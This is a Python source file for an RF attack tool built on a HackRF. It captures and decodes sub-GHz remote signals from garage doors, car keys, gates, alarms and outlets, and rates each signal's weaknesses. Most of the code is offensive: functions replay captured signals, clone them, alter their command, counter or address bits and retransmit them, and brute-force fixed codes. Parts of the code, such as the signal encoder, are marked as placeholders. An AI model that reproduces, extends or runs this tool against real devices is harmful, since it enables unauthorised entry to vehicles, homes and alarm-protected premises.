#!/usr/bin/env python3
"""
Universal RF Reverse Engineering Framework
Fixed & Enhanced Version
"""

import os
import sys
import time
import json
import argparse
import hashlib
import logging
from collections import Counter
from dataclasses import dataclass, asdict
from enum import Enum
from typing import List, Dict, Optional, Tuple, Any

import numpy as np
import matplotlib.pyplot as plt
from scipy import signal as scipy_signal
import subprocess

# =============================================================================
# Configuration & Logging
# =============================================================================
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("URF")

# Default SDR settings
DEFAULT_SAMPLE_RATE = 8_000_000
DEFAULT_FREQUENCY = 433_920_000

# =============================================================================
# Enums & Data Classes
# =============================================================================
class DeviceType(Enum):
    CAR_KEY_ROLLING = "car_key_rolling"
    CAR_KEY_FIXED = "car_key_fixed"
    GARAGE_DOOR = "garage_door"
    GATE_CONTROLLER = "gate_controller"
    ALARM_SYSTEM = "alarm_system"
    REMOTE_CONTROL = "remote_control"
    POWER_OUTLET = "power_outlet"
    DOORBELL = "doorbell"
    PAGER = "pager"
    SMART_HOME = "smart_home"
    UNKNOWN = "unknown"

class SignalType(Enum):
    FIXED_CODE = "fixed"
    ROLLING_CODE = "rolling"
    ENCRYPTED = "encrypted"
    TIMESTAMP = "timestamp"
    LEARNING_CODE = "learning"

@dataclass
class DecodedSignal:
    raw_bits: str
    hex_data: str
    modulation: str
    encoding: str
    baud_rate: int
    frequency: int
    snr_db: float
    preamble: Optional[str] = None
    address: Optional[str] = None
    command: Optional[str] = None
    counter: Optional[str] = None
    checksum: Optional[str] = None
    device_type: DeviceType = DeviceType.UNKNOWN
    signal_type: SignalType = SignalType.FIXED_CODE
    is_vulnerable: bool = True
    vulnerability_type: List[str] = None
    timestamp: float = 0.0
    notes: str = ""

# =============================================================================
# Extended Protocol Database
# =============================================================================
class ProtocolDatabase:
    KNOWN_PROTOCOLS = {
        "dip_switch_12bit": {
            "device_type": DeviceType.GARAGE_DOOR,
            "signal_type": SignalType.FIXED_CODE,
            "pattern": {"total_bits": 12, "structure": "CCCCCCCCCCCC"},
            "notes": "Common 12-bit DIP switch garage openers",
        },
        "chamberlain_rolling": {
            "device_type": DeviceType.GARAGE_DOOR,
            "signal_type": SignalType.ROLLING_CODE,
            "pattern": {
                "total_bits": 66,
                "preamble": "10" * 6,
                "structure": "PPPPPPPPPPPPSSSSSSSSSSSSSSSSCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC",
            },
            "notes": "Chamberlain/LiftMaster Security+ (rolling code)",
        },
        "keeloq_standard": {
            "device_type": DeviceType.CAR_KEY_ROLLING,
            "signal_type": SignalType.ROLLING_CODE,
            "pattern": {
                "total_bits": 66,
                "preamble_bits": 12,
                "function_bits": 4,
                "encrypted_bits": 32,
                "serial_bits": 28,
                "structure": "PPPPPPPPPPPPFFFFEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEESSSSSSSSSSSSSSSSSSSSSSSSSSSS",
            },
            "notes": "KeeLoq cipher - used in many car keys",
        },
        "ev1527_learning": {
            "device_type": DeviceType.REMOTE_CONTROL,
            "signal_type": SignalType.LEARNING_CODE,
            "pattern": {"total_bits": 24, "address_bits": 20, "data_bits": 4, "structure": "AAAAAAAAAAAAAAAAAAADDDD"},
            "notes": "EV1527 chip - common in cheap remotes",
        },
        "pt2262": {
            "device_type": DeviceType.REMOTE_CONTROL,
            "signal_type": SignalType.FIXED_CODE,
            "pattern": {"total_bits": 24, "structure": "AAAAAAAAAAAAAAAAAAAADDDD"},
            "notes": "PT2262 chip - tri-state encoding",
        },
        "outlet_1527": {
            "device_type": DeviceType.POWER_OUTLET,
            "signal_type": SignalType.LEARNING_CODE,
            "pattern": {"total_bits": 24, "house_code_bits": 20, "unit_bits": 4, "structure": "HHHHHHHHHHHHHHHHHHHUUUU"},
            "notes": "Wireless power outlet with learning mode",
        },
        "doorbell_simple": {
            "device_type": DeviceType.DOORBELL,
            "signal_type": SignalType.FIXED_CODE,
            "pattern": {"total_bits": 24, "structure": "CCCCCCCCCCCCCCCCCCCCCCCC"},
            "notes": "Simple wireless doorbell",
        },
        "pocsag_pager": {
            "device_type": DeviceType.PAGER,
            "signal_type": SignalType.FIXED_CODE,
            "pattern": {"preamble": "10101010" * 18, "total_bits": 544, "structure": "complex"},
            "notes": "POCSAG pager protocol",
        },
        "alarm_contact": {
            "device_type": DeviceType.ALARM_SYSTEM,
            "signal_type": SignalType.ROLLING_CODE,
            "pattern": {"total_bits": 48, "structure": "SSSSSSSSSSSSSSSSCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDD"},
            "notes": "Wireless alarm sensor",
        },
        # New protocols added for complexity
        "came_top432": {
            "device_type": DeviceType.GATE_CONTROLLER,
            "signal_type": SignalType.ROLLING_CODE,
            "pattern": {"total_bits": 66, "preamble": "101010101010101010101010", "structure": "PPPPPPPPPPPPPPPPPPPPPPPPCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"},
            "notes": "CAME TOP432 rolling code",
        },
        "nice_flor": {
            "device_type": DeviceType.GATE_CONTROLLER,
            "signal_type": SignalType.ROLLING_CODE,
            "pattern": {"total_bits": 72, "structure": "PPPPPPPPPPPPSSSSSSSSSSSSSSSSSSSSSSSSCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"},
            "notes": "Nice FLO series rolling code",
        },
        "holtek_ht12e": {
            "device_type": DeviceType.REMOTE_CONTROL,
            "signal_type": SignalType.FIXED_CODE,
            "pattern": {"total_bits": 12, "address_bits": 8, "data_bits": 4, "structure": "AAAAAAAADDDD"},
            "notes": "Holtek HT12E encoder",
        },
    }

    @staticmethod
    def identify_protocol(bits: str, baud_rate: int = 0) -> Optional[Dict]:
        bit_length = len(bits)
        candidates = []
        for proto_name, proto_info in ProtocolDatabase.KNOWN_PROTOCOLS.items():
            pattern = proto_info.get("pattern", {})
            expected_bits = pattern.get("total_bits", 0)
            if expected_bits > 0 and abs(bit_length - expected_bits) <= 2:
                candidates.append({"name": proto_name, "info": proto_info, "confidence": 0.8})
            if "preamble" in pattern:
                preamble = pattern["preamble"]
                if bits.startswith(preamble):
                    candidates.append({"name": proto_name, "info": proto_info, "confidence": 0.9})
        if candidates:
            return max(candidates, key=lambda x: x["confidence"])
        return None

# =============================================================================
# Enhanced Signal Analyzer
# =============================================================================
class UniversalSignalAnalyzer:
    def __init__(self):
        self.protocol_db = ProtocolDatabase()

    def analyze_iq_file(self, filename: str, sample_rate: int = DEFAULT_SAMPLE_RATE) -> DecodedSignal:
        logger.info(f"Analyzing IQ file: {filename}")
        samples = np.fromfile(filename, dtype=np.int8)
        iq_samples = samples[::2] + 1j * samples[1::2]

        modulation = self._detect_modulation(iq_samples)
        logger.info(f"Modulation: {modulation}")

        baud_rate = self._detect_baud_rate(iq_samples, sample_rate)
        logger.info(f"Baud Rate: ~{baud_rate} bps")

        snr_db = self._calculate_snr(iq_samples)
        logger.info(f"SNR: {snr_db:.1f} dB")

        if "ASK" in modulation or "OOK" in modulation:
            bits = self._demodulate_ask(iq_samples, sample_rate, baud_rate)
        elif "FSK" in modulation:
            bits = self._demodulate_fsk(iq_samples, sample_rate, baud_rate)
        else:
            bits = np.array([])

        logger.info(f"Demodulated bits: {len(bits)}")

        encoding = self._detect_encoding(bits)
        logger.info(f"Encoding: {encoding}")

        if encoding == "Manchester":
            decoded_bits = self._decode_manchester(bits)
        elif encoding == "PWM":
            decoded_bits = self._decode_pwm(bits)
        else:
            decoded_bits = bits

        bit_string = ''.join(map(str, decoded_bits.astype(int)))
        hex_data = self._bits_to_hex(decoded_bits)

        protocol_match = self.protocol_db.identify_protocol(bit_string, baud_rate)
        if protocol_match:
            logger.info(f"Protocol: {protocol_match['name']} (confidence: {protocol_match['confidence']*100:.0f}%)")

        components = self._extract_components(bit_string, protocol_match)

        decoded = DecodedSignal(
            raw_bits=bit_string,
            hex_data=hex_data,
            modulation=modulation,
            encoding=encoding,
            baud_rate=baud_rate,
            frequency=0,
            snr_db=snr_db,
            preamble=components.get("preamble"),
            address=components.get("address"),
            command=components.get("command"),
            counter=components.get("counter"),
            checksum=components.get("checksum"),
            device_type=protocol_match['info']['device_type'] if protocol_match else DeviceType.UNKNOWN,
            signal_type=protocol_match['info']['signal_type'] if protocol_match else SignalType.FIXED_CODE,
            timestamp=time.time(),
        )
        decoded = self._assess_security(decoded)
        return decoded

    def _detect_modulation(self, iq_samples: np.ndarray) -> str:
        magnitude = np.abs(iq_samples)
        phase = np.angle(iq_samples)
        mag_var = np.var(magnitude / (np.max(magnitude) + 1e-9))
        phase_diff_std = np.std(np.diff(phase))
        inst_freq_std = np.std(np.diff(np.unwrap(phase)))
        if mag_var > 0.05 and phase_diff_std < 0.5:
            return "ASK/OOK"
        elif inst_freq_std > 0.01 and mag_var < 0.3:
            return "FSK"
        elif phase_diff_std > 0.5:
            return "PSK"
        return "Unknown"

    def _detect_baud_rate(self, iq_samples: np.ndarray, sample_rate: int) -> int:
        envelope = np.abs(iq_samples)
        envelope = envelope - np.mean(envelope)
        autocorr = np.correlate(envelope, envelope, mode='full')
        autocorr = autocorr[len(autocorr)//2:]
        threshold = np.max(autocorr) * 0.3
        for i in range(10, min(10000, len(autocorr))):
            if autocorr[i] > threshold:
                if i > 0 and autocorr[i] > autocorr[i-1] and autocorr[i] > autocorr[i+1]:
                    return int(sample_rate / i)
        return 1000

    def _calculate_snr(self, iq_samples: np.ndarray) -> float:
        power = np.abs(iq_samples) ** 2
        signal_power = np.max(power)
        sorted_power = np.sort(power)
        noise_power = np.mean(sorted_power[:len(sorted_power)//10])
        if noise_power > 0:
            return 10 * np.log10(signal_power / noise_power)
        return 0.0

    def _demodulate_ask(self, iq_samples: np.ndarray, sample_rate: int, baud_rate: int) -> np.ndarray:
        envelope = np.abs(iq_samples)
        # Dynamic threshold with hysteresis to fix demodulation issues
        cutoff = baud_rate * 2
        sos = scipy_signal.butter(4, cutoff, fs=sample_rate, output='sos')
        filtered = scipy_signal.sosfilt(sos, envelope)
        # Improved clock recovery: find optimal sampling point
        samples_per_symbol = int(sample_rate / baud_rate)
        sampled_bits = []
        for i in range(0, len(filtered) - samples_per_symbol, samples_per_symbol):
            window = filtered[i:i+samples_per_symbol]
            if len(window) > 0:
                sampled_bits.append(np.mean(window))  # Integrate over symbol period
        if sampled_bits:
            # Otsu-like threshold for better noise handling
            threshold = (np.max(sampled_bits) + np.min(sampled_bits)) / 2
            return (np.array(sampled_bits) > threshold).astype(int)
        return np.array([])

    def _demodulate_fsk(self, iq_samples: np.ndarray, sample_rate: int, baud_rate: int) -> np.ndarray:
        phase = np.angle(iq_samples)
        inst_freq = np.diff(np.unwrap(phase))
        cutoff = baud_rate * 2
        sos = scipy_signal.butter(4, cutoff, fs=sample_rate, output='sos')
        filtered = scipy_signal.sosfilt(sos, inst_freq)
        samples_per_symbol = int(sample_rate / baud_rate)
        sampled_bits = []
        for i in range(0, len(filtered) - samples_per_symbol, samples_per_symbol):
            window = filtered[i:i+samples_per_symbol]
            if len(window) > 0:
                sampled_bits.append(np.mean(window))
        if sampled_bits:
            threshold = np.median(sampled_bits)
            return (np.array(sampled_bits) > threshold).astype(int)
        return np.array([])

    def _detect_encoding(self, bits: np.ndarray) -> str:
        if len(bits) < 100:
            return "Unknown"
        transitions = np.sum(np.abs(np.diff(bits.astype(int))))
        transition_rate = transitions / len(bits)
        if 0.8 < transition_rate < 1.2:
            return "Manchester"
        runs = []
        current_run = 1
        for i in range(1, len(bits)):
            if bits[i] == bits[i-1]:
                current_run += 1
            else:
                runs.append(current_run)
                current_run = 1
        if runs and np.var(runs) > 5:
            return "PWM"
        return "NRZ"

    def _decode_manchester(self, bits: np.ndarray) -> np.ndarray:
        decoded = []
        i = 0
        while i < len(bits) - 1:
            if bits[i] == 1 and bits[i+1] == 0:
                decoded.append(0)
            elif bits[i] == 0 and bits[i+1] == 1:
                decoded.append(1)
            i += 2
        return np.array(decoded)

    def _decode_pwm(self, bits: np.ndarray) -> np.ndarray:
        transitions = np.where(np.abs(np.diff(bits.astype(int))) != 0)[0]
        if len(transitions) < 2:
            return bits
        pulse_widths = np.diff(transitions)
        median_width = np.median(pulse_widths)
        decoded = []
        for width in pulse_widths:
            decoded.append(0 if width < median_width * 1.5 else 1)
        return np.array(decoded)

    def _bits_to_hex(self, bits: np.ndarray) -> str:
        if len(bits) == 0:
            return ""
        bit_string = ''.join(map(str, bits.astype(int)))
        padding = (8 - len(bit_string) % 8) % 8
        bit_string = bit_string + '0' * padding
        hex_values = []
        for i in range(0, len(bit_string), 8):
            byte = bit_string[i:i+8]
            if len(byte) == 8:
                hex_values.append(f"{int(byte, 2):02X}")
        return ' '.join(hex_values)

    def _extract_components(self, bits: str, protocol_match: Optional[Dict]) -> Dict[str, str]:
        components = {}
        if not protocol_match:
            if len(bits) >= 16:
                for preamble in ["1010101010101010", "1111111100000000"]:
                    if bits.startswith(preamble[:min(len(preamble), len(bits))]):
                        components["preamble"] = bits[:16]
                        break
            return components
        pattern = protocol_match['info'].get('pattern', {})
        structure = pattern.get('structure', '')
        if not structure:
            return components
        idx = 0
        comp_map = {'P': 'preamble', 'S': 'address', 'C': 'command', 'E': 'counter',
                    'F': 'function', 'A': 'address', 'D': 'command', 'H': 'address', 'U': 'command'}
        component_type = None
        component_start = 0
        for i, char in enumerate(structure):
            if char != component_type:
                if component_type:
                    comp_name = comp_map.get(component_type, 'unknown')
                    if component_start < len(bits):
                        components[comp_name] = bits[component_start:min(i, len(bits))]
                component_type = char
                component_start = i
        if component_type and component_start < len(bits):
            comp_name = comp_map.get(component_type, 'unknown')
            components[comp_name] = bits[component_start:]
        return components

    def _assess_security(self, decoded: DecodedSignal) -> DecodedSignal:
        vulnerabilities = []
        if decoded.signal_type == SignalType.FIXED_CODE:
            vulnerabilities.append("Simple Replay Attack")
            vulnerabilities.append("Brute Force Possible")
            decoded.is_vulnerable = True
        elif decoded.signal_type == SignalType.LEARNING_CODE:
            vulnerabilities.append("Learning Mode Exploitation")
            decoded.is_vulnerable = True
        elif decoded.signal_type == SignalType.ROLLING_CODE:
            if decoded.counter and len(decoded.counter) <= 16:
                vulnerabilities.append("RollBack Attack (Small Counter)")
                decoded.is_vulnerable = True
            else:
                vulnerabilities.append("Possible RollBack Attack")
        if decoded.device_type == DeviceType.CAR_KEY_ROLLING and "keeloq" in decoded.notes.lower():
            vulnerabilities.append("KeeLoq Cipher (Known Weaknesses)")
        if decoded.snr_db < 10:
            vulnerabilities.append("Low SNR - May Need Amplification")
        decoded.vulnerability_type = vulnerabilities
        return decoded

# =============================================================================
# Signal Explainer (Enhanced)
# =============================================================================
class SignalExplainer:
    @staticmethod
    def explain_signal(decoded: DecodedSignal, interactive: bool = True):
        print(f"\n{'='*70}")
        print("SIGNAL EXPLANATION")
        print(f"{'='*70}")
        print(f"  Device Type: {decoded.device_type.value.upper().replace('_', ' ')}")
        print(f"  Signal Type: {decoded.signal_type.value.upper()}")
        print(f"  Total Bits: {len(decoded.raw_bits)}")
        print(f"  Modulation: {decoded.modulation}")
        print(f"  Encoding: {decoded.encoding}")
        print(f"  SNR: {decoded.snr_db:.1f} dB\n")
        if decoded.preamble:
            print(f"  PREAMBLE ({len(decoded.preamble)} bits): {decoded.preamble}")
            if interactive: input("Press Enter...")
        if decoded.address:
            print(f"  ADDRESS/ID ({len(decoded.address)} bits): {decoded.address}")
            if interactive: input("Press Enter...")
        if decoded.command:
            print(f"  COMMAND ({len(decoded.command)} bits): {decoded.command}")
            SignalExplainer._explain_command(decoded.command, decoded.device_type)
            if interactive: input("Press Enter...")
        if decoded.counter:
            print(f"  COUNTER ({len(decoded.counter)} bits): {decoded.counter}")
        print(f"\n{'─'*70}")
        print("SECURITY ASSESSMENT:")
        for i, vuln in enumerate(decoded.vulnerability_type, 1):
            print(f"  {i}. {vuln}")
        print(f"{'─'*70}\n")

    @staticmethod
    def _explain_command(command_bits: str, device_type: DeviceType):
        if not command_bits:
            return
        cmd_int = int(command_bits, 2)
        if device_type in [DeviceType.CAR_KEY_ROLLING, DeviceType.CAR_KEY_FIXED]:
            meanings = {0: "Lock", 1: "Unlock", 2: "Trunk/Boot", 3: "Panic/Alarm"}
            print(f"  -> {meanings.get(cmd_int, 'Unknown')}")
        elif device_type == DeviceType.POWER_OUTLET:
            state = "ON" if cmd_int % 2 == 1 else "OFF"
            unit = cmd_int // 2
            print(f"  -> Unit {unit}: {state}")
        elif device_type == DeviceType.REMOTE_CONTROL:
            buttons = ["A", "B", "C", "D"]
            print(f"  -> Button {buttons[cmd_int] if cmd_int < len(buttons) else cmd_int}")

    @staticmethod
    def _bits_to_hex_simple(bits: str) -> str:
        if not bits:
            return "N/A"
        bits = bits + '0' * ((4 - len(bits) % 4) % 4)
        return ''.join(f"{int(bits[i:i+4], 2):X}" for i in range(0, len(bits), 4))

# =============================================================================
# Enhanced RF Tool with Brute-Force, Logging, and Visualization
# =============================================================================
class UniversalRFTool:
    def __init__(self, frequency: int = DEFAULT_FREQUENCY, sample_rate: int = DEFAULT_SAMPLE_RATE):
        self.frequency = frequency
        self.sample_rate = sample_rate
        self.analyzer = UniversalSignalAnalyzer()
        self.history = []  # Store analysis history

    def capture_and_decode(self, duration: float = 2.0, output_file: str = "capture.iq") -> DecodedSignal:
        logger.info(f"Capturing at {self.frequency/1e6:.3f} MHz for {duration}s")
        for i in range(3, 0, -1):
            print(f"Activate device in {i}...")
            time.sleep(1)
        print(">>> ACTIVATE DEVICE NOW! <<<")
        cmd = ['hackrf_transfer', '-r', output_file, '-f', str(self.frequency),
               '-s', str(self.sample_rate), '-a', '1', '-l', '40', '-g', '62',
               '-n', str(int(self.sample_rate * duration * 2))]
        try:
            subprocess.run(cmd, check=True, capture_output=True, timeout=duration+5)
        except Exception as e:
            logger.error(f"Capture failed: {e}")
            return None
        if not os.path.exists(output_file):
            logger.error("Capture file not created")
            return None
        decoded = self.analyzer.analyze_iq_file(output_file, self.sample_rate)
        decoded.frequency = self.frequency
        self.history.append(decoded)
        return decoded

    def replay_signal(self, iq_file: str, repeat: int = 1, delay_ms: int = 100) -> bool:
        logger.info(f"Replay: {iq_file} x{repeat}")
        if input("Execute replay? (yes/no): ").lower() != 'yes':
            return False
        time.sleep(3)
        for i in range(repeat):
            print(f"[{i+1}/{repeat}] Transmitting...")
            cmd = ['hackrf_transfer', '-t', iq_file, '-f', str(self.frequency),
                   '-s', str(self.sample_rate), '-a', '1', '-x', '47']
            try:
                subprocess.run(cmd, check=True, capture_output=True, timeout=10)
            except Exception as e:
                logger.error(f"TX error: {e}")
                return False
            if i < repeat - 1:
                time.sleep(delay_ms / 1000.0)
        print("[✓] Replay complete!")
        return True

    def clone_signal(self, decoded: DecodedSignal, output_file: str = "cloned.iq") -> str:
        logger.info("Cloning signal from decoded bits")
        iq_samples = self._encode_bits_to_iq(decoded.raw_bits, decoded.baud_rate,
                                              decoded.encoding, decoded.modulation)
        iq_int8 = np.zeros(len(iq_samples) * 2, dtype=np.int8)
        iq_int8[::2] = (np.real(iq_samples) * 127).astype(np.int8)
        iq_int8[1::2] = (np.imag(iq_samples) * 127).astype(np.int8)
        iq_int8.tofile(output_file)
        logger.info(f"Cloned signal saved: {output_file}")
        return output_file

    def _encode_bits_to_iq(self, bits: str, baud_rate: int, encoding: str, modulation: str) -> np.ndarray:
        # Simplified IQ encoding (placeholder for actual implementation)
        bit_arr = np.array([int(b) for b in bits])
        samples_per_symbol = int(self.sample_rate / baud_rate)
        if encoding == "Manchester":
            encoded = []
            for b in bit_arr:
                encoded.extend([1, 0] if b == 0 else [0, 1])
            bit_arr = np.array(encoded)
        signal = np.repeat(bit_arr, samples_per_symbol)
        iq = signal.astype(np.complex64)
        return iq

    def modify_and_send(self, decoded: DecodedSignal):
        print(f"\n{'='*70}\nSIGNAL MODIFICATION\n{'='*70}")
        print(f"  Address: {decoded.address}")
        print(f"  Command: {decoded.command}")
        print(f"  Counter: {decoded.counter}")
        print("\nOptions: 1. Change command  2. Increment counter  3. Change address  4. Bit flip  5. Cancel")
        choice = input("Select (1-5): ")
        modified_bits = decoded.raw_bits
        if choice == '1' and decoded.command:
            new_cmd = input("New command (decimal): ")
            try:
                new_cmd_bits = format(int(new_cmd), f'0{len(decoded.command)}b')
                cmd_start = modified_bits.find(decoded.command)
                if cmd_start >= 0:
                    modified_bits = modified_bits[:cmd_start] + new_cmd_bits + modified_bits[cmd_start+len(decoded.command):]
                    print(f"[✓] Command changed to {new_cmd_bits}")
            except ValueError:
                logger.error("Invalid command value")
        elif choice == '2' and decoded.counter:
            try:
                new_counter = int(decoded.counter, 2) + 1
                new_counter_bits = format(new_counter, f'0{len(decoded.counter)}b')
                counter_start = modified_bits.find(decoded.counter)
                if counter_start >= 0:
                    modified_bits = modified_bits[:counter_start] + new_counter_bits + modified_bits[counter_start+len(decoded.counter):]
                    print(f"[✓] Counter incremented to {new_counter_bits}")
            except ValueError:
                logger.error("Invalid counter")
        elif choice == '3' and decoded.address:
            new_addr = input("New address (binary): ")
            if len(new_addr) == len(decoded.address) and all(c in '01' for c in new_addr):
                addr_start = modified_bits.find(decoded.address)
                if addr_start >= 0:
                    modified_bits = modified_bits[:addr_start] + new_addr + modified_bits[addr_start+len(decoded.address):]
                    print(f"[✓] Address changed to {new_addr}")
        elif choice == '4':
            pos = int(input("Bit position to flip: "))
            if 0 <= pos < len(modified_bits):
                bit_list = list(modified_bits)
                bit_list[pos] = '0' if bit_list[pos] == '1' else '1'
                modified_bits = ''.join(bit_list)
                print(f"[✓] Bit {pos} flipped")
        elif choice == '5':
            return
        else:
            print("[!] Invalid choice")
        # Clone and replay
        temp_decoded = DecodedSignal(
            raw_bits=modified_bits, hex_data="", modulation=decoded.modulation,
            encoding=decoded.encoding, baud_rate=decoded.baud_rate,
            frequency=decoded.frequency, snr_db=decoded.snr_db
        )
        clone_file = self.clone_signal(temp_decoded, "modified.iq")
        self.replay_signal(clone_file)

    def brute_force(self, decoded: DecodedSignal, delay_ms: int = 50):
        """Brute-force attack for fixed-code devices."""
        if decoded.signal_type != SignalType.FIXED_CODE:
            print("[!] Brute force only works on fixed-code devices")
            return
        if not decoded.command or len(decoded.command) > 8:
            print("[!] Command field too large for brute force")
            return
        total_combinations = 2 ** len(decoded.command)
        print(f"\n{'='*70}\nBRUTE FORCE ATTACK\n{'='*70}")
        print(f"  Command field: {len(decoded.command)} bits")
        print(f"  Total combinations: {total_combinations}")
        print(f"  Estimated time: {total_combinations * (delay_ms/1000):.1f}s")
        if input("Proceed? (yes/no): ").lower() != 'yes':
            return
        for i in range(total_combinations):
            cmd_bits = format(i, f'0{len(decoded.command)}b')
            print(f"[{i+1}/{total_combinations}] Testing {cmd_bits}...")
            # Generate and transmit
            temp_bits = decoded.raw_bits.replace(decoded.command, cmd_bits)
            temp_decoded = DecodedSignal(
                raw_bits=temp_bits, hex_data="", modulation=decoded.modulation,
                encoding=decoded.encoding, baud_rate=decoded.baud_rate,
                frequency=decoded.frequency, snr_db=decoded.snr_db
            )
            clone_file = self.clone_signal(temp_decoded, "brute_temp.iq")
            self._transmit(clone_file)
            time.sleep(delay_ms / 1000.0)
        print("[✓] Brute force complete!")

    def _transmit(self, iq_file: str):
        cmd = ['hackrf_transfer', '-t', iq_file, '-f', str(self.frequency),
               '-s', str(self.sample_rate), '-a', '1', '-x', '47']
        try:
            subprocess.run(cmd, check=True, capture_output=True, timeout=5)
        except Exception as e:
            logger.error(f"TX error: {e}")

    def visualize_signal(self, decoded: DecodedSignal, save_path: str = None):
        """Plot signal components for analysis."""
        fig, axes = plt.subplots(3, 1, figsize=(12, 8))
        # Bit visualization
        bits = [int(b) for b in decoded.raw_bits]
        axes[0].step(range(len(bits)), bits, where='mid')
        axes[0].set_title("Demodulated Bits")
        axes[0].set_ylim(-0.5, 1.5)
        # Component breakdown
        comps = {}
        if decoded.preamble:
            comps['Preamble'] = len(decoded.preamble)
        if decoded.address:
            comps['Address'] = len(decoded.address)
        if decoded.command:
            comps['Command'] = len(decoded.command)
        if decoded.counter:
            comps['Counter'] = len(decoded.counter)
        if comps:
            axes[1].bar(comps.keys(), comps.values())
            axes[1].set_title("Component Lengths")
        # Spectrum placeholder
        axes[2].text(0.5, 0.5, f"Frequency: {decoded.frequency/1e6:.3f} MHz\nSNR: {decoded.snr_db:.1f} dB",
                     ha='center', va='center', transform=axes[2].transAxes)
        axes[2].set_title("Signal Info")
        plt.tight_layout()
        if save_path:
            plt.savefig(save_path)
            logger.info(f"Visualization saved: {save_path}")
        else:
            plt.show()

    def export_report(self, decoded: DecodedSignal, filename: str = "report.json"):
        """Export analysis to JSON."""
        report = asdict(decoded)
        report['device_type'] = decoded.device_type.value
        report['signal_type'] = decoded.signal_type.value
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
        logger.info(f"Report exported: {filename}")

# =============================================================================
# Command-Line Interface
# =============================================================================
def main():
    parser = argparse.ArgumentParser(description="Universal RF Reverse Engineering Framework")
    parser.add_argument('--capture', action='store_true', help='Capture and analyze signal')
    parser.add_argument('--replay', type=str, help='Replay IQ file')
    parser.add_argument('--clone', action='store_true', help='Clone signal from bits')
    parser.add_argument('--modify', action='store_true', help='Interactive signal modification')
    parser.add_argument('--brute-force', action='store_true', help='Brute force attack')
    parser.add_argument('--explain', action='store_true', help='Explain signal bits')
    parser.add_argument('--visualize', action='store_true', help='Visualize signal')
    parser.add_argument('--freq', type=float, default=433.92, help='Frequency in MHz')
    parser.add_argument('--duration', type=float, default=2.0, help='Capture duration')
    parser.add_argument('--repeat', type=int, default=1, help='Replay repetitions')
    parser.add_argument('--output', type=str, default='capture.iq', help='Output file')
    parser.add_argument('--export', type=str, help='Export report to JSON')
    args = parser.parse_args()

    tool = UniversalRFTool(frequency=int(args.freq * 1e6))

    if args.capture:
        decoded = tool.capture_and_decode(duration=args.duration, output_file=args.output)
        if decoded:
            if args.explain:
                SignalExplainer.explain_signal(decoded)
            if args.visualize:
                tool.visualize_signal(decoded)
            if args.export:
                tool.export_report(decoded, args.export)
            if args.clone:
                tool.clone_signal(decoded)
            if args.modify:
                tool.modify_and_send(decoded)
            if args.brute_force:
                tool.brute_force(decoded)
    elif args.replay:
        tool.replay_signal(args.replay, args.repeat)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
